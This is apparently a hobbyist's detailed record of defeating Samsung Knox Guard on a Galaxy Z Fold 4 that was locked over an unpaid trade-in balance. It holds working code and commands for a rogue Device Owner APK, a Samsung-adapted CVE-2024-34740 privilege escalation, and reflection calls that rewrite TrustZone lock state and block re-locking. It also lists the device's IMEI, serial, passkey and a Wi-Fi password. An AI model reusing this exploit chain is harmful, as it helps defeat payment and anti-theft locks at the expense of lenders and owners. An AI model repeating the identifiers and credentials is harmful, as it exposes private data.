# Samsung Galaxy Z Fold 4 Knox Guard Unlock -- Full Technical Documentation

**Author:** kyin
**Dates:** March 18-19, 2026
**Device:** SM-F936U1, Serial RFCW2006DLA, Firmware F936U1UES3CWF3
**Status:** Working temporary unlock; permanent solution in progress

---

## Table of Contents

- [Device Specifications](#device-specifications)
- [Knox Guard Overview](#knox-guard-overview)
- [Phase 1: Getting ADB Access](#phase-1-getting-adb-access)
- [Phase 2: Failed Approaches](#phase-2-failed-approaches)
- [Phase 3: CVE-2024-34740 (AbxOverflow)](#phase-3-cve-2024-34740-abxoverflow)
- [Phase 4: KnoxGuard Service Exploitation](#phase-4-knoxguard-service-exploitation)
- [Phase 5: The 8133 Problem](#phase-5-the-8133-problem)
- [Phase 6: The Guardian and Its Failures](#phase-6-the-guardian-and-its-failures)
- [Phase 7: kgclient Behavior](#phase-7-kgclient-behavior)
- [Current State](#current-state)
- [Future Work](#future-work)
- [Knox Guard Architecture Reference](#knox-guard-architecture-reference)
- [Complete File Inventory](#complete-file-inventory)

---

## Device Specifications

| Field | Value |
|---|---|
| Model | Samsung Galaxy Z Fold 4 |
| Model Number | SM-F936U1 (US unlocked variant) |
| Carrier | XAA |
| IMEI | 356954474735469 |
| Serial | RFCW2006DLA |
| Passkey | 23198483 |
| Firmware | F936U1UES3CWF3 |
| Android Version | 13 (API 33) |
| Build Date | June 2023 |
| Security Patch Level | July 1, 2023 |
| Bootloader | Locked (BIT 3, SECURE DOWNLOAD ENABLE) |
| Chipset | Qualcomm Snapdragon 8+ Gen 1 (SM8475) |
| KG Status | LOCKED (01), FRP LOCK ON |
| KG Reason | "balance due for failure to meet trade-in terms" |
| OTP Fuse | `ro.boot.kg.bit` = 01 (hardware fuse, permanent) |
| WiFi for setup | SSID: `coconutWater` / Password: `9093255140` |
| AT Modem | `/dev/tty.usbmodemRFCW2006DLA2` at 115200 baud |

The phone was purchased secondhand and arrived Knox Guard locked. KG activates from cached local state within 1-2 seconds of boot, regardless of internet connectivity.

---

## Knox Guard Overview

Knox Guard (KG) is Samsung's enterprise device management lock. When active:

- Displays a full-screen lock overlay that blocks all user interaction
- Disables USB debugging (ADB)
- Prevents access to Settings, Developer Options, and most system features
- Survives factory resets (state stored in TrustZone RPMB -- hardware-backed)
- Has a permanent hardware OTP fuse (`ro.boot.kg.bit`) that cannot be cleared
- Checks integrity of its client app (`com.samsung.android.kgclient`) on every boot
- Communicates with Samsung servers to receive lock/unlock commands

### KG State Machine (TrustZone RPMB)

| State | Value | Meaning |
|---|---|---|
| Prenormal | 0 | KG not yet activated. Device is free. |
| Checking | 1 | KG checking status with Samsung server |
| Active | 2 | KG provisioned but not currently locked |
| Locked | 3 | KG actively locking the device |
| Completed | 4 | KG obligations met, device permanently released |
| Error | 5 | KG in error state |

The state is read from RPMB on every boot by `KnoxGuardNative.tz_getTAState()` and written to `ro.boot.kg` (e.g., `0x3` = Locked). The human-readable property `knox.kg.state` is set from this value.

### Key System Properties

| Property | Description |
|---|---|
| `knox.kg.state` | Human-readable KG state (Locked, Active, Completed, etc.) |
| `ro.boot.kg` | Boot property reflecting RPMB state (0x0-0x5) |
| `ro.boot.kg.bit` | OTP fuse value (01 = KG enabled, hardware, permanent) |

### Key Files on Device

| Path | Description |
|---|---|
| `/system/framework/services.jar` | Contains KnoxGuardSeService + KnoxGuardNative (classes3.dex) |
| `/system/priv-app/KnoxGuard/` | KG system service APK |
| `/data/data/com.samsung.android.kgclient/` | kgclient app data (cached policies) |
| `/data/system/packages.xml` | Package manager state (ABX binary XML format) |
| `/data/system/install_sessions.xml` | PackageInstaller session state (ABX format) |
| `/data/misc/adb/adb_keys` | Authorized ADB public keys |

---

## Phase 1: Getting ADB Access

### The Problem

KG blocks everything on the phone. The lock screen overlay intercepts all touches and prevents access to any system UI. USB debugging is disabled. There is no way to interact with the phone through its own interface.

### The Breakthrough: Android Enterprise QR Provisioning

During a factory reset, the Setup Wizard runs before KG fully activates. Android Enterprise QR provisioning allows installing a Device Owner (DO) app during this brief window. A Device Owner has elevated privileges, including the ability to enable USB debugging via `DevicePolicyManager.setGlobalSetting()`.

### Building the Device Owner APK

A custom Device Owner APK (`com.kyin.adbenab`) was built that performs these actions when provisioned:

1. **Enables USB debugging:** `dpm.setGlobalSetting(admin, Settings.Global.ADB_ENABLED, "1")`
2. **Enables developer options:** `dpm.setGlobalSetting(admin, "development_settings_enabled", "1")`
3. **Pre-loads ADB public key:** Writes the Mac's ADB public key directly to `/data/misc/adb/adb_keys` so ADB connects without the authorization dialog (which would be invisible behind the KG overlay)
4. **Does NOT disable kgclient:** An early version hid kgclient via `dpm.setApplicationHidden()`, which triggered error 8133. This was removed.

**Source:** `/Users/kyin/adb_enabler/`

The APK was built manually without Android Studio:

```bash
cd /Users/kyin/adb_enabler
export ANDROID_HOME=/opt/homebrew/share/android-commandlinetools
export BUILD_TOOLS=$ANDROID_HOME/build-tools/33.0.2
export PLATFORM=$ANDROID_HOME/platforms/android-33

# Compile resources -> Link -> Compile Java -> DEX -> Package -> Align -> Sign
$BUILD_TOOLS/aapt2 compile --dir res -o compiled_res.zip
$BUILD_TOOLS/aapt2 link compiled_res.zip -I $PLATFORM/android.jar --manifest AndroidManifest.xml --java gen -o intermediate.apk
javac -source 1.8 -target 1.8 -cp $PLATFORM/android.jar -d classes src/com/kyin/adbenab/*.java gen/com/kyin/adbenab/R.java
$BUILD_TOOLS/d8 classes/com/kyin/adbenab/*.class --output dex_output --lib $PLATFORM/android.jar
cp intermediate.apk unsigned.apk && cd dex_output && zip -u ../unsigned.apk classes.dex && cd ..
$BUILD_TOOLS/zipalign -f 4 unsigned.apk aligned.apk
$BUILD_TOOLS/apksigner sign --ks debug.keystore --ks-pass pass:android --key-pass pass:android --ks-key-alias key0 --out adbenab.apk aligned.apk
```

### QR Code Provisioning Flow

1. **Serve the APK:**
   ```bash
   cp /Users/kyin/adb_enabler/adbenab.apk /Users/kyin/Downloads/serve_apk/
   cd /Users/kyin/Downloads/serve_apk && python3 -m http.server 8888
   ```

2. **QR code payload** (JSON):
   ```json
   {
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.kyin.adbenab/.AdbEnableReceiver",
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "http://192.168.4.125:8888/adbenab.apk",
     "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": "<SHA256_BASE64_URL_SAFE>",
     "android.app.extra.PROVISIONING_WIFI_SSID": "coconutWater",
     "android.app.extra.PROVISIONING_WIFI_PASSWORD": "9093255140",
     "android.app.extra.PROVISIONING_WIFI_SECURITY_TYPE": "WPA",
     "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true
   }
   ```

3. **On the phone:** Factory reset -> WiFi setup screen -> Tap 6 times to open QR scanner -> Scan QR -> Phone downloads APK, installs as Device Owner

4. **Provisioning flow:**
   - `AdbEnableReceiver.onProfileProvisioningComplete()` fires
   - `ProvisioningActivity` handles `GET_PROVISIONING_MODE` (returns fully managed device, mode=1)
   - `ProvisioningActivity` handles `ADMIN_POLICY_COMPLIANCE` (enables ADB, pre-loads key)
   - ADB is now accessible

5. **Verify:**
   ```bash
   /opt/homebrew/bin/adb devices    # RFCW2006DLA    device
   /opt/homebrew/bin/adb shell id   # uid=2000(shell) gid=2000(shell)
   ```

**ADB persists through reboots** because the ADB public key was written to `/data/misc/adb/adb_keys`. The "Always Allow" checkbox on the ADB authorization dialog (when it can be shown) makes this permanent.

---

## Phase 2: Failed Approaches

Every approach listed here was tried and failed. They are documented to prevent wasting time repeating them.

### 2.1: Phone-Side Approaches (all blocked by KG overlay)

| Attempt | Result |
|---|---|
| Samsung Knox support calls | Dead end for secondhand buyers |
| Emergency dialer codes (`*#0808#`, `*#0*#`, `*#7353#`) | Blocked by emergency dialer restrictions |
| Home screen race condition (1-2 sec before KG activates) | Window too short for anything useful |
| Accessibility shortcuts (Power+Vol Up, Vol Up+Vol Down 3s) | No response on KG screen |
| USB keyboard via USB-C | No response on KG screen |
| Notification shade from Support menu | Tapping Settings redirects back to KG |
| Airplane mode toggle during boot | KG overrides and reconnects |
| Quick Share method | Requires Accessibility access |
| Maintenance Mode | Requires Settings access |
| Bixby/Google Assistant voice | Disabled by KG |

### 2.2: macOS USB/Flash Approaches (all blocked by Apple's CDC driver)

| Attempt | Result |
|---|---|
| Heimdall (original 2017) | Protocol too old, handshake fails |
| Heimdall (grimler fork, built from source) | Same handshake failure |
| Thor (Samsung-Loki v1.1.0 macOS) | Binary broken, looks for `/dev/bus/usb` (Linux path) |
| Custom Python pyusb Odin implementation | USB write times out, CDC driver claims interface |
| `sudo kextunload` CDC driver | "kext is in use or retained" (SIP blocks) |
| Heimdall kext install | "package is attempting to install content to system volume" (SIP) |

### 2.3: AT Modem Commands (limited by Samsung PACM)

The modem is accessible at `/dev/tty.usbmodemRFCW2006DLA2`:
```bash
screen /dev/tty.usbmodemRFCW2006DLA2 115200
```

| Command | Result |
|---|---|
| `AT` | OK (modem alive) |
| `AT+DEVCONINFO` | Returns full device info |
| `AT+SWATD=0` | Switches to DDEXE mode |
| `AT+SYSSCOPE=1,0` | +SYSSCOPE:1,NORMAL |
| `AT+USBDEBUG` | +USBDEBUG:1,NG_NONE (responds but doesn't enable ADB) |
| `AT+USBDEBUG=?` | Exists but BLOCKED by PACM |
| `AT+DEBUGLVC=0,5` | PROTECTED_NO_TOK (needs auth token) |
| `AT+ACTIVATE` | BLOCKED |
| 60+ other commands | All UNREGISTERED or NOT_ALLOWED |

### 2.4: ADB Sideload (Recovery Mode)

ADB detects the phone in sideload mode (`RFCW2006DLA sideload`), but:
- `adb shell` -> "error: closed" (no shell access)
- `adb install` -> fails
- `adb sideload APK` -> signature verification failed (needs Samsung-signed OTA)

### 2.5: VM Approaches

| Attempt | Result |
|---|---|
| UTM/QEMU | Confirmed broken for USB passthrough on Apple Silicon (QEMU bug #2178) |
| Parallels | Unverified for Samsung USB on Apple Silicon |

### 2.6: ADB Shell Attempts (after QR provisioning gave us ADB)

| Attempt | Result |
|---|---|
| `pm disable-user --user 0 com.samsung.android.kgclient` | **Triggered error 8133** (NEVER DO THIS) |
| `service call knoxguard_service 36` from shell (UID 2000) | Permission denied: wrong UID |
| Samsung TTS/FTL exploit chain | Blocked by July 2023 SPL (TTS downgrade rejected) |
| CVE-2024-31317 (Zygote injection) | Failed on Samsung Android 13 (Samsung's modified Zygote flow) |

**Critical correction:** Early research incorrectly identified TX 36 as a "disable KG" command. TX 36 is actually `isVpnExceptionRequired()` -- a read-only query. TX 22 (`unlockScreen`) is the real unlock method, but it still requires UID 1000.

### 2.7: Commercial Services

| Service | Result |
|---|---|
| cleanimei.com | Z Fold 4 KG removal SOLD OUT |
| samsungtool.us | Device verified in system but requires Windows |

---

## Phase 3: CVE-2024-34740 (AbxOverflow)

### Overview

CVE-2024-34740 is an integer overflow in Android's Binary XML serializer. When `BinaryXmlSerializer.attributeBytesBase64()` writes a byte array of exactly 65536 bytes, `writeShort(value.length)` truncates the length to 0. On the next read, `BinaryXmlPullParser` reads 0 bytes for the "checksum" value, then encounters the actual payload bytes and interprets them as raw ABX tokens.

**CVE:** CVE-2024-34740 / A-307288067
**Source:** https://github.com/michalbednarski/AbxOverflow
**Patched in:** August 2024 security bulletin
**This phone:** July 2023 SPL -- vulnerable

### The Vulnerability

```java
// BinaryXmlSerializer.attributeBytesBase64():
mOut.writeShort(value.length);  // 65536 -> 0 (short overflow)
mOut.write(value);              // 65536 bytes written as raw ABX tokens
```

### What the Exploit Does

1. **Injects fake PackageInstaller sessions** into `install_sessions.xml` via the overflow
2. **Session A:** `stageDir="/data/system"`, `prepared="true"` -- gives read/write access to `/data/system`
3. **Session B:** `stageDir="/data/app/dropped_apk"`, `prepared="false"` -- creates a new app directory
4. **Drops an APK** into `/data/app/dropped_apk/base.apk` via Session B
5. **Reads `packages.xml`** via Session A's `openRead()`, patches it to register the new APK with `sharedUserId="1000"`
6. **Writes patched XML** as `packages-backup.xml` in `/data/system` (system reads backup when it exists, treating primary as corrupted)
7. After two system_server crashes, the dropped APK runs as UID 1000 inside system_server

### Samsung-Specific Modifications

The original PoC assumes a **userspace restart** after system_server crashes. Samsung does a **full reboot** instead, which kills the `RebootBackgroundRunner` process (even with `setsid()`). Two changes were required:

**1. Mac-side orchestration (`run_exploit.sh`):**

Instead of the background runner surviving the reboot, a Mac-side script polls ADB between reboots and relaunches the app for each stage:

```bash
# Stage 1: ABX injection
$ADB shell am start -n "$PKG/.MainActivity" --ei stage 1
# ... poll for STAGE1_DONE, wait for reboot ...
wait_adb && wait_boot

# Stage 2: packages.xml patch + APK drop
$ADB shell am start -n "$PKG/.MainActivity" --ei stage 2 --activity-clear-task
# ... poll for STAGE2_DONE, wait for reboot ...
wait_adb && wait_boot

# Verify
$ADB shell pm list packages | grep droppedapk
```

**2. Stage-aware ExploitMainActivity:**

Modified `app/src/main/java/com/example/abxoverflow/MainActivity.java` to accept `--ei stage N` intent extras:

```java
int stage = intent.getIntExtra("stage", 0);
if (stage == 1) {
    Main.stage1(MainActivity.this);
    Main.crashSystemServer();
} else if (stage == 2) {
    Main.stage2(MainActivity.this);
    Main.crashSystemServer();
}
```

**3. `--activity-clear-task` flag:**

After the first reboot, launching the app without this flag reuses the old Activity instance, and the stage-2 Thread in `onCreate()` never runs. The flag forces fresh Activity creation.

### The droppedapk Manifest

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:sharedUserId="android.uid.system">
    <application
        android:process="system"
        ...>
        <activity android:name=".MainActivity" android:showWhenLocked="true" ... />
        <receiver android:name=".LaunchReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

- `android:sharedUserId="android.uid.system"` -- requests UID 1000
- `android:process="system"` -- loads into system_server process (required because SELinux has no `seapp_contexts` rule for `user=system seinfo=default`)
- `android:showWhenLocked="true"` -- allows Activity to display over the KG lock screen

### The System_Server Crash Mechanism

The crash uses a `Parcelable` chain:

1. `IAlarmManager.set()` accepts `AlarmManager.AlarmClockInfo`
2. `AlarmClockInfo` calls deprecated `readParcelable()` without type argument
3. Specifies `android.content.pm.PackageParser$Activity` as the Parcelable class
4. This invokes any public constructor accepting a single `Parcel` argument
5. Specifies `android.os.PooledStringWriter`, which calls `writeInt(0)` on the provided `Parcel`
6. That `writeInt()` is on the `data` Parcel from `onTransact()`, backed by read-only `mmap`-ed `/dev/binder` memory
7. Write to read-only memory causes SIGSEGV, crashing system_server

### The pastSigs Trick

To register droppedapk with `sharedUserId="1000"`, the exploit adds the droppedapk's signing certificate to the `<shared-user name="android.uid.system">` element's `<pastSigs>`:

```xml
<shared-user name="android.uid.system" userId="1000">
  <sigs count="1" schemeVersion="3">
    <cert index="3" />
    <pastSigs count="2" schemeVersion="3">
      <cert index="19" flags="2" />
      <cert index="19" flags="2" />
    </pastSigs>
  </sigs>
</shared-user>
```

The certificate is duplicated twice because the last `pastSig` entry is considered the "current" signature and is ignored during `checkCapability()`. `flags="2"` means the certificate is trusted for `sharedUserId` purposes.

### Verifying Success

```bash
# Check droppedapk is installed
adb shell pm list packages | grep droppedapk
# package:com.example.abxoverflow.droppedapk

# Verify UID 1000
adb shell dumpsys package com.example.abxoverflow.droppedapk | grep userId
# userId=1000, sharedUser=SharedUserSetting{... android.uid.system/1000}

# Launch and verify execution context
adb shell am start -n com.example.abxoverflow.droppedapk/.MainActivity
# Activity shows: BUILD v11-AUTOBOOT | UID=1000 PID=<system_server_pid>
```

---

## Phase 4: KnoxGuard Service Exploitation

With droppedapk running as UID 1000 inside system_server, Java reflection bypasses all Binder permission checks because we are calling methods on objects in the same process -- no IPC, no permission enforcement.

### Service Discovery

The `knoxguard_service` binder is obtained via `ServiceManager.getService("knoxguard_service")`. Because droppedapk runs inside system_server, this returns the actual service implementation object (not a Binder proxy), allowing direct method invocation.

### Service-Level Methods (KnoxGuardSeService)

| Method | Signature | Effect |
|---|---|---|
| `setRemoteLockToLockscreen` | `(boolean)` | `false` clears KG lock overlay |
| `unlockCompleted` | `()` | Marks unlock as complete in service state |
| `unbindFromLockScreen` | `()` | Unbinds KG from the Android lock screen |
| `unlockScreen` | `()` | Wraps native unlock + additional service logic |
| `lockScreen` | `(...)` | Re-locks the screen (do not call) |
| `getTAState` | `()` | Returns current TrustZone TA state |
| `setCheckingState` | `()` | Sets state to Checking(1) |
| `removeActiveAdmin` | `(ComponentName)` | Removes a device admin |

### TrustZone Native Methods (KnoxGuardNative)

`KnoxGuardNative` is in `services.jar` (classes3.dex), not the boot classpath. It must be loaded via the service's own classloader:

```java
Class<?> sm = Class.forName("android.os.ServiceManager");
Object kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
ClassLoader cl = kgService.getClass().getClassLoader();
Class<?> nativeClass = cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
```

| Method | Signature | Returns | Description |
|---|---|---|---|
| `tz_getTAState` | `(int)` | `KgErrWrapper` | Read RPMB state (0-5) |
| `tz_unlockScreen` | `(int)` | `KgErrWrapper` | Tell TA to unlock |
| `tz_lockScreen` | `(int)` | `KgErrWrapper` | Tell TA to lock |
| `tz_userChecking` | `(int)` | `KgErrWrapper` | Set checking state |
| `tz_resetRPMB` | `(int)` or `(int, byte[])` | `KgErrWrapper` | Reset RPMB data |

All native methods return `KgErrWrapper` objects, not simple integers. Unwrapping requires reflection:

```java
private String unwrapKgErr(Object kgService, Object wrapper) {
    // Try getIntResult on the service
    Method m = kgService.getClass().getDeclaredMethod("getIntResult", wrapper.getClass());
    m.setAccessible(true);
    Object intResult = m.invoke(kgService, wrapper);
    // Also dump fields: data, err, result, KGTA_FAILED, KGTA_PARAM_DEFAULT, TAG
    for (Field f : wrapper.getClass().getDeclaredFields()) {
        f.setAccessible(true);
        // ...
    }
}
```

### TrustZone Call Results

| Call | Result |
|---|---|
| `tz_getTAState(0)` BEFORE | `int=3` (Locked) |
| `tz_unlockScreen(0)` | `err=0, result=0` (SUCCESS) |
| `tz_userChecking(0)` | `err=262` (failed, doesn't matter) |
| `tz_resetRPMB(0, new byte[0])` | `err=0, result=0` (SUCCESS) |
| `tz_getTAState(0)` AFTER | `int=2` (Active) |

**The TA state changed from Locked(3) to Active(2) in RPMB.** After reboot, `ro.boot.kg` changed from `0x3` to `0x2`. This persists through reboots and factory resets.

### Additional Actions from UID 1000

1. **Unregistered KG boot receivers** to prevent re-lock during the current session:
   ```java
   Field receiverField = kgService.getClass().getDeclaredField("mSystemReceiver");
   receiverField.setAccessible(true);
   Object receiver = receiverField.get(kgService);
   ctx.unregisterReceiver((BroadcastReceiver) receiver);
   receiverField.set(kgService, null);
   // Same for mServiceSystemReceiver
   ```

2. **Set system property:**
   ```java
   Class<?> sysProp = Class.forName("android.os.SystemProperties");
   sysProp.getMethod("set", String.class, String.class).invoke(null, "knox.kg.state", "Completed");
   ```

3. **Re-enabled kgclient** (to prevent 8133):
   ```java
   Object pmBinder = sm.getMethod("getService", String.class).invoke(null, "package");
   Method setEnabled = pmBinder.getClass().getDeclaredMethod(
       "setApplicationEnabledSetting", String.class, int.class, int.class, int.class, String.class);
   setEnabled.setAccessible(true);
   setEnabled.invoke(pmBinder, "com.samsung.android.kgclient", 1, 0, 0, "android");
   // 1 = COMPONENT_ENABLED_STATE_ENABLED
   ```

4. **Attempted `clearDeviceOwner`** via DevicePolicyManagerService -- failed. Samsung's DPM binder doesn't have the expected `this$0` field structure.

### What Does NOT Work from UID 1000

| Attempt | Why It Failed |
|---|---|
| `service call knoxguard_service 36` from droppedapk via `Runtime.exec()` | SELinux blocks `exec` from system_server context |
| Binder proxy calls to knoxguard_service | Permission check still enforced on IPC path |
| `run-as com.example.abxoverflow.droppedapk` | "not an application" (runs inside system process) |

---

## Phase 5: The 8133 Problem

### What is Error 8133?

Error 8133 is a **dynamically computed bitfield**, not a stored value. It is computed on every boot by `IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()`.

The method checks whether kgclient and its 6 core components are enabled. Each disabled component sets a bit in the error code. When the kgclient app itself is disabled plus all 6 components, the result is 8133.

### The 6 Checked Components

| Component | Full Name |
|---|---|
| KGDeviceAdminReceiver | `com.samsung.android.kgclient/.KGDeviceAdminReceiver` |
| SystemIntentReceiver | `com.samsung.android.kgclient/.SystemIntentReceiver` |
| SelfupdateReceiver | `com.samsung.android.kgclient/.SelfupdateReceiver` |
| KGEventService | `com.samsung.android.kgclient/.KGEventService` |
| AlarmService | `com.samsung.android.kgclient/.AlarmService` |
| KGProvider | `com.samsung.android.kgclient/.KGProvider` |

### IntegritySeUtil Additional Checks

Beyond the 6 components, IntegritySeUtil also verifies:
- kgclient is signed with Android platform signature
- kgclient's version code >= 300000000
- kgclient has `FLAG_SYSTEM` set
- TA integrity via RPMB and HMAC verification

### How 8133 Was Triggered

The Device Owner APK's early version called `dpm.setApplicationHidden(admin, "com.samsung.android.kgclient", true)`, which disabled the app and all its components. On the next boot, IntegritySeUtil computed the full bitfield: 8133.

The error appeared on the KG lock screen as "Abnormal detection (8133)".

### How 8133 Was Fixed

1. **Updated the Device Owner APK** to remove the kgclient disable code
2. **Re-enabled kgclient from droppedapk** (UID 1000) via PackageManagerService reflection:
   ```java
   setEnabled.invoke(pmBinder, "com.samsung.android.kgclient", 1, 0, 0, "android");
   ```
3. **Also re-enabled all 6 components** individually (same reflection pattern)
4. **Rebooted** -- IntegritySeUtil check passed, no error code shown

### Why `pm disable-user` is Catastrophic

Running `pm disable-user --user 0 com.samsung.android.kgclient` from ADB shell disables the app AND all 6 components simultaneously. This:
- Triggers the full 8133 bitfield
- Shows "Abnormal detection (8133)" on the KG screen
- Makes the situation harder to diagnose (looks like a tamper detection)
- Requires UID 1000 access to fix (shell UID 2000 cannot re-enable system apps with the right caller)

**NEVER run `pm disable-user` on kgclient.**

---

## Phase 6: The Guardian and Its Failures

### The Auto-Boot Unlock (v11-AUTOBOOT) -- Working

The first successful approach: `LaunchReceiver` catches `BOOT_COMPLETED` and runs the full unlock sequence as a one-shot:

1. `setRemoteLockToLockscreen(false)` -- clears KG overlay
2. `unlockCompleted()` -- marks unlock complete
3. `unbindFromLockScreen()` -- unbinds from lock screen
4. `tz_unlockScreen(0)` -- changes RPMB state
5. `tz_resetRPMB(0, new byte[0])` -- resets RPMB data
6. `Settings.Global.putInt(ADB_ENABLED, 1)` -- re-enables ADB
7. `SystemProperties.set("knox.kg.state", "Completed")` -- sets property

This worked. KG flashed briefly on boot, then cleared. Phone was usable.

### The Guardian Thread (v12) -- Worked Then Broke

v12 added a persistent background thread that re-runs the unlock sequence every 5 seconds (then every 30 seconds after stabilization). This was intended to counteract kgclient's re-lock behavior.

**Initial result:** Stable after 30 seconds on fresh boot. KG stayed away.

### enforceProtections (v13+) -- Broke Everything

v13 added additional protective measures (`enforceProtections`). This required reinstalling droppedapk via `adb install -r` to deploy the new code.

**Root cause of failure:** `adb install -r` corrupts the UID mapping. When the exploit originally installs droppedapk, files are created with UID 1000 ownership. `adb install -r` rewrites the APK files with UID 0 (root) ownership, but the package database still says UID 1000. This mismatch causes the app to crash or behave unpredictably.

### The Critical Lesson

**NEVER use `adb install -r` on droppedapk after the exploit has installed it.** All code changes must be baked into the droppedapk source before running the exploit. The exploit is the only safe way to install this APK with correct UID 1000 file ownership.

---

## Phase 7: kgclient Behavior

### How kgclient Works

`com.samsung.android.kgclient` is a system app that manages the client side of Knox Guard:

1. **On boot:** Receives `BOOT_COMPLETED` broadcast
2. **Checks cached policy:** Reads locally cached lock command from its app data directory
3. **Contacts Samsung servers:** Queries `us-kcs-api.samsungknox.com` and related endpoints
4. **Receives commands:** Samsung server sends lock/unlock commands based on the device's KG status
5. **Executes lock:** Calls `lockScreen()` on `KnoxGuardSeService`, which sets the overlay and disables ADB

### kgclient Re-Lock Behavior

After the droppedapk's unlock sequence runs, kgclient performs its own boot sequence:

1. kgclient's `BOOT_COMPLETED` receiver fires (after droppedapk's, based on boot order)
2. kgclient reads its cached lock policy
3. kgclient finds a cached "lock" command from Samsung servers
4. kgclient calls `lockScreen()` on KnoxGuardSeService
5. KG overlay reappears, ADB is disabled
6. This happens approximately 3-5 minutes after boot

### What Was Tried to Block kgclient

| Approach | Result |
|---|---|
| Delete kgclient cached data via `pm clear` | Triggers error 3001 (data cleared detection) |
| Delete kgclient files directly via `File.delete()` from UID 1000 | Not yet tested -- viable path |
| `NetworkPolicyManager` to block kgclient's network access | Failed (API didn't work as expected) |
| `dpm.setApplicationHidden()` on kgclient | Triggers error 8133 |
| DNS blocker on Mac | Only works if phone uses Mac as DNS (fragile) |
| Disable CONNECTIVITY_CHANGE receiver | Not yet tested -- viable path |

### kgclient's Trigger Chain

```
BOOT_COMPLETED -> kgclient.SystemIntentReceiver
    -> checks cached lock policy
    -> if lock command cached: lockScreen()

CONNECTIVITY_CHANGE -> kgclient re-checks with Samsung server
    -> receives lock command
    -> lockScreen()
```

### Key Insight: Direct File Deletion vs pm clear

`pm clear` triggers the `ON_PACKAGE_DATA_CLEARED` event in `KGEventHandler`, which calls `lockSeDevice(ERROR_CLIENT_APP_DATA_CLEARED="3001")`. This is a hard lock that shows error 3001 on the KG screen.

**Direct file deletion** (via `File.delete()` or `Runtime.exec("rm")` from UID 1000) does NOT trigger this event because it bypasses the PackageManager entirely. This is a viable path for removing cached lock commands.

---

## Current State

### What is Running on the Phone

| Component | Status |
|---|---|
| droppedapk (v11-AUTOBOOT) | Installed as UID 1000, runs on BOOT_COMPLETED |
| kgclient | Enabled (not disabled, to prevent 8133) |
| Device Owner (com.kyin.adbenab) | Installed as DO |
| TA State (RPMB) | Active(2) |
| `ro.boot.kg` | 0x2 |
| `knox.kg.state` | Set to "Completed" by droppedapk on boot |
| ADB | Enabled on boot by droppedapk, disabled by kgclient ~3 min later |

### Boot Sequence Timeline

```
t=0s    Boot starts
t=~20s  system_server starts, droppedapk loaded into process
t=~25s  BOOT_COMPLETED broadcast
t=~25s  droppedapk LaunchReceiver fires, runs unlock sequence
t=~26s  KG overlay clears, ADB enabled
t=~30s  kgclient BOOT_COMPLETED fires
t=~30s  kgclient reads cached lock policy
t=~180s kgclient executes lock: KG overlay returns, ADB disabled
t=?     Reboot -> cycle repeats
```

### The 30-Minute Monitor

A monitoring script confirmed that when kgclient has no cached lock command (fresh factory reset, no server contact), the unlock holds indefinitely:

```
23:41:39 kg=Completed adb=device
23:41:42 kg=Completed adb=device
... (continuous for 24+ data points)
23:42:50 kg=Completed adb=device
```

This proves the unlock mechanism itself is solid. The only problem is kgclient's cached server command.

---

## Future Work

### Priority 1: Bake Guardian Thread into droppedapk Source

Add a persistent background thread to `LaunchReceiver.java` that re-runs the unlock sequence every 5-30 seconds. This must be compiled into the droppedapk source **before** running the exploit. Do not use `adb install -r`.

```java
// In LaunchReceiver.onReceive(), after the one-shot unlock:
new Thread(() -> {
    while (true) {
        try { Thread.sleep(30000); } catch (InterruptedException e) { break; }
        runUnlockSequence(context);  // Same sequence as one-shot
    }
}).start();
```

### Priority 2: Delete kgclient Cached Data

From UID 1000, delete kgclient's cached lock command files without going through `pm clear`:

```java
// From droppedapk running as UID 1000:
File kgDataDir = new File("/data/data/com.samsung.android.kgclient/");
// Recursively delete shared_prefs/, databases/, cache/
// This does NOT trigger error 3001
```

### Priority 3: Disable Non-Essential kgclient Components

kgclient has receivers beyond the 6 checked by IntegritySeUtil. Specifically, the `CONNECTIVITY_CHANGE` receiver triggers server contact and re-lock. Disabling this specific receiver from UID 1000 may prevent re-lock without triggering 8133, since IntegritySeUtil only checks the 6 listed components.

### Priority 4: NetworkPolicyManager Exploration

The `NetworkPolicyManager` API surface hasn't been fully explored. From UID 1000, it should be possible to set per-UID network policies that block kgclient's network access entirely.

### Priority 5: CVE-2024-34664 Multi-User Bypass

A Samsung-specific vulnerability (pre-October 2024 SPL) in the multi-user implementation. Theoretical -- would need to create a secondary user profile that bypasses KG restrictions. Untested.

---

## Knox Guard Architecture Reference

### Service Call Graph

```
KnoxGuardSeService (in services.jar, system_server process)
  |
  |-- onStart()
  |     |-- registers mSystemReceiver (BroadcastReceiver)
  |     |-- registers mServiceSystemReceiver (BroadcastReceiver)
  |
  |-- handleBootCompleted()
  |     |-- IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()
  |     |     |-- checks kgclient enabled
  |     |     |-- checks 6 components enabled
  |     |     |-- checks platform signature
  |     |     |-- checks minimum version code
  |     |     |-- if any fail -> compute error bitfield (e.g., 8133)
  |     |
  |     |-- KnoxGuardNative.tz_getTAState(0)
  |     |     |-- reads RPMB via TrustZone
  |     |     |-- returns state (0-5)
  |     |
  |     |-- if state == Locked(3):
  |     |     bindAndSetToLockScreen()
  |     |     -> full KG lock overlay displayed
  |     |
  |     |-- if state == Active(2):
  |     |     SKIP lock binding
  |     |     -> phone boots normally
  |     |     (but kgclient may re-lock via its own receiver)
  |     |
  |     |-- if state == Completed(4) or Prenormal(0):
  |           No action, device is free
  |
  |-- KnoxGuardNative (JNI bridge to TrustZone TA)
  |     |-- tz_getTAState(int) -> KgErrWrapper
  |     |-- tz_unlockScreen(int) -> KgErrWrapper
  |     |-- tz_lockScreen(int) -> KgErrWrapper
  |     |-- tz_userChecking(int) -> KgErrWrapper
  |     |-- tz_resetRPMB(int) / tz_resetRPMB(int, byte[]) -> KgErrWrapper
  |
  |-- IntegritySeUtil (client integrity checking)
  |     |-- checkKGClientIntegrityAndEnableComponentsWithFlag()
  |     |-- checkSignatures() (platform signature validation)
  |     |-- isEnabled() (component enabled check)
  |
  |-- SystemIntentProcessor
